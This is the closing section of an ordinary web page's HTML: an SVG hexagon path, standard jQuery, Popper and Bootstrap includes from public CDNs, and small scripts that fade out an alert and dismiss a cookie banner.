                    <path d="M63.4372 22.8624C66.2475 27.781 66.2475 33.819 63.4372 38.7376L54.981 53.5376C52.1324 58.5231 46.8307 61.6 41.0887 61.6H24.4562C18.7142 61.6 13.4125 58.5231 10.564 53.5376L2.10774 38.7376C-0.702577 33.819 -0.702582 27.781 2.10774 22.8624L10.564 8.06243C13.4125 3.07687 18.7142 0 24.4562 0H41.0887C46.8307 0 52.1324 3.07686 54.981 8.06242L63.4372 22.8624Z">
                    </path>
                </clippath>
            </defs>
        </svg></div>
</body>

<script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.5.4/dist/umd/popper.min.js"></script>
<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
<script>
    function showAlert() {
        $('.alert').addClass('show').fadeIn();
        setTimeout(function() {
            $('.alert').fadeOut().removeClass('show');
        }, 5000); // Hide after 3 seconds
    }

    $(document).ready(function() {
        showAlert();
    });
</script>
<script>
document.addEventListener('DOMContentLoaded', function() {
    const bannercookie = document.querySelector('.cookie-banner');
    const toggleButton = document.querySelector('.dismiss-button');

    toggleButton.addEventListener('click', function() {
        bannercookie.style = "display: none;";
    });
});
</script>
</html>